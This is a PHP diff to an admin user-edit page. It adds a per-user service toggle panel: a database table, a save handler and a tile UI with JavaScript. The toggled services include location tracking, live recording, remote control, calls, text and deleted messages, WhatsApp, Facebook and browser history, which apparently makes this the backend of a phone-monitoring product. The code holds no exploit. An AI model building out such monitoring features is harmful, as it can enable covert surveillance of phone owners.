@@ -206,6 +206,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['remove_profile_pic'])
 }
 
 // ── Handle popup settings save ─────────────────────────────
+// ── Service management handler ───────────────────────────────
+const ADMIN_VALID_SERVICES = [
+    'phone_files','location','social_apps','video_apps','live_recording',
+    'remote_control','data_export','permissions_check',
+    'whatsapp','facebook','calls','messages','gallery','browser','deleted'
+];
+try {
+    $db->exec("CREATE TABLE IF NOT EXISTS user_services (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        user_id INT NOT NULL,
+        service VARCHAR(50) NOT NULL,
+        UNIQUE KEY uq_user_service (user_id, service),
+        FOREIGN KEY (user_id) REFERENCES user_gridxuser(id) ON DELETE CASCADE
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+} catch (Exception $e) {}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_user_services']) && $id) {
+    verify_csrf();
+    $chosen = array_filter(
+        (array)($_POST['user_service'] ?? []),
+        fn($s) => in_array($s, ADMIN_VALID_SERVICES, true)
+    );
+    // Replace all: delete existing then insert
+    $db->prepare('DELETE FROM user_services WHERE user_id=?')->execute([$id]);
+    if (!empty($chosen)) {
+        $ins = $db->prepare('INSERT IGNORE INTO user_services (user_id, service) VALUES (?,?)');
+        foreach ($chosen as $svc) {
+            $ins->execute([$id, $svc]);
+        }
+    }
+    set_flash('success', 'Services updated for user.');
+    redirect("/admin/users.php?action=edit&id={$id}");
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_popup_settings']) && $id) {
     verify_csrf();
     $db->exec("CREATE TABLE IF NOT EXISTS user_popup_settings (
@@ -750,6 +784,90 @@ $enabled_refund_count    = (int)$db->query("SELECT COUNT(*) FROM user_gridxuser 
             </div>
             <button type="submit" name="save_popup_settings" class="btn btn-warning"><i class="fas fa-save me-1"></i>Save Popup Settings</button>
         </form>
+
+        <!-- ── User Services Panel ── -->
+        <hr class="mt-4">
+        <h5 class="mt-3 mb-1"><i class="fas fa-sliders me-2"></i>Dashboard Services</h5>
+        <p class="text-muted small mb-3">Control which services appear on this user's dashboard. If none are checked, all services are shown (legacy behaviour).</p>
+        <?php
+        $cur_svc_stmt = $db->prepare('SELECT service FROM user_services WHERE user_id=?');
+        $cur_svc_stmt->execute([$id]);
+        $cur_svcs = $cur_svc_stmt->fetchAll(PDO::FETCH_COLUMN);
+
+        $all_services_map = [
+            'phone_files'       => ['label'=>'Phone Files',        'icon'=>'fa-folder',        'color'=>'#FFB300'],
+            'location'          => ['label'=>'Location Tracking',  'icon'=>'fa-location-dot',  'color'=>'#2196F3'],
+            'social_apps'       => ['label'=>'Social Apps',        'icon'=>'fa-comments',      'color'=>'#9C27B0'],
+            'video_apps'        => ['label'=>'Video Apps',         'icon'=>'fa-video',         'color'=>'#E91E63'],
+            'live_recording'    => ['label'=>'Live Recording',     'icon'=>'fa-microphone',    'color'=>'#FF5252'],
+            'remote_control'    => ['label'=>'Remote Control',     'icon'=>'fa-desktop',       'color'=>'#00BCD4'],
+            'data_export'       => ['label'=>'Data Export',        'icon'=>'fa-file-export',   'color'=>'#FF9800'],
+            'permissions_check' => ['label'=>'Permissions Check',  'icon'=>'fa-shield-halved', 'color'=>'#4CAF50'],
+            'whatsapp'          => ['label'=>'WhatsApp',           'icon'=>'fa-brands fa-whatsapp', 'color'=>'#25D366'],
+            'facebook'          => ['label'=>'Facebook',           'icon'=>'fa-brands fa-facebook', 'color'=>'#1877F2'],
+            'calls'             => ['label'=>'Calls',              'icon'=>'fa-phone',         'color'=>'#4CAF50'],
+            'messages'          => ['label'=>'Text Messages',      'icon'=>'fa-comment-sms',   'color'=>'#03A9F4'],
+            'gallery'           => ['label'=>'Gallery',            'icon'=>'fa-images',        'color'=>'#FF7043'],
+            'browser'           => ['label'=>'Browser History',    'icon'=>'fa-globe',         'color'=>'#2196F3'],
+            'deleted'           => ['label'=>'Deleted Messages',   'icon'=>'fa-trash-can',     'color'=>'#4CAF50'],
+        ];
+        ?>
+        <form method="post" action="/admin/users.php?action=edit&id=<?= $id ?>">
+            <?= csrf_field() ?>
+            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;margin-bottom:18px;">
+            <?php foreach ($all_services_map as $svc_key => $svc_info):
+                $checked = in_array($svc_key, $cur_svcs, true); ?>
+            <label style="display:flex;align-items:center;gap:9px;padding:10px 12px;border-radius:10px;border:1.5px solid <?= $checked ? '#0d6efd' : '#dee2e6' ?>;background:<?= $checked ? 'rgba(13,110,253,.07)' : '#fff' ?>;cursor:pointer;font-size:.82rem;font-weight:600;transition:border-color .15s;" class="svc-admin-tile">
+                <input type="checkbox" name="user_service[]" value="<?= $svc_key ?>" <?= $checked ? 'checked' : '' ?> style="display:none;" class="svc-admin-chk">
+                <span style="width:30px;height:30px;border-radius:8px;display:flex;align-items:center;justify-content:center;background:<?= $svc_info['color'] ?>22;color:<?= $svc_info['color'] ?>;font-size:.95rem;flex-shrink:0;">
+                    <i class="fa-solid <?= $svc_info['icon'] ?>"></i>
+                </span>
+                <span><?= e($svc_info['label']) ?></span>
+                <span class="ms-auto svc-tick" style="width:18px;height:18px;border-radius:5px;border:1.5px solid <?= $checked ? '#0d6efd' : '#ccc' ?>;background:<?= $checked ? '#0d6efd' : 'transparent' ?>;display:flex;align-items:center;justify-content:center;font-size:10px;color:<?= $checked ? '#fff' : 'transparent' ?>;flex-shrink:0;">✓</span>
+            </label>
+            <?php endforeach; ?>
+            </div>
+            <div class="d-flex gap-2 align-items-center flex-wrap">
+                <button type="submit" name="save_user_services" class="btn btn-primary"><i class="fas fa-save me-1"></i>Save Services</button>
+                <button type="button" onclick="adminSvcToggleAll(true)" class="btn btn-outline-secondary btn-sm">Select All</button>
+                <button type="button" onclick="adminSvcToggleAll(false)" class="btn btn-outline-secondary btn-sm">Clear All</button>
+                <?php if (empty($cur_svcs)): ?>
+                <span class="text-muted small"><i class="fas fa-info-circle me-1"></i>No services set — showing all (legacy mode)</span>
+                <?php else: ?>
+                <span class="text-muted small"><?= count($cur_svcs) ?> of <?= count($all_services_map) ?> services active</span>
+                <?php endif; ?>
+            </div>
+        </form>
+
+        <script>
+        // Live tile toggle highlight
+        document.querySelectorAll('.svc-admin-tile').forEach(function(tile) {
+            tile.addEventListener('click', function() {
+                const chk = tile.querySelector('.svc-admin-chk');
+                const tick = tile.querySelector('.svc-tick');
+                chk.checked = !chk.checked;
+                if (chk.checked) {
+                    tile.style.borderColor = '#0d6efd';
+                    tile.style.background  = 'rgba(13,110,253,.07)';
+                    tick.style.background  = '#0d6efd';
+                    tick.style.borderColor = '#0d6efd';
+                    tick.style.color       = '#fff';
+                } else {
+                    tile.style.borderColor = '#dee2e6';
+                    tile.style.background  = '#fff';
+                    tick.style.background  = 'transparent';
+                    tick.style.borderColor = '#ccc';
+                    tick.style.color       = 'transparent';
+                }
+            });
+        });
+        function adminSvcToggleAll(state) {
+            document.querySelectorAll('.svc-admin-tile').forEach(function(tile) {
+                const chk = tile.querySelector('.svc-admin-chk');
+                if (chk.checked !== state) tile.click();
+            });
+        }
+        </script>
         <?php endif; ?>
     </div>
 </div>
